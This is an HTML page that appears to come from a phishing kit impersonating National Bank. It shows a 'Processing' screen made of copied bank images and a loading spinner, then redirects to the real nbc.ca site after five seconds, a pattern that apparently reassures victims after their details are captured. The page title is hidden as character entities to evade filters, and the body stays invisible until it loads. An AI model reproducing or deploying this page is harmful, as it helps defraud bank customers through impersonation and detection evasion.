<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#32;&#124;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www.nbc.ca/en/personal.html"></html>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1024px; height:104px; z-index:0"><img src="images/bc18.png" alt="" title="" border=0 width=1024 height=104></div>

<div id="image2" style="position:absolute; overflow:hidden; left:145px; top:138px; width:280px; height:73px; z-index:1"><img src="images/bc19.png" alt="" title="" border=0 width=280 height=73></div>

<div id="image3" style="position:absolute; overflow:hidden; left:458px; top:284px; width:142px; height:142px; z-index:2"><img src="images/load.gif" alt="" title="" border=0 width=142 height=142></div>


</body>
</html>
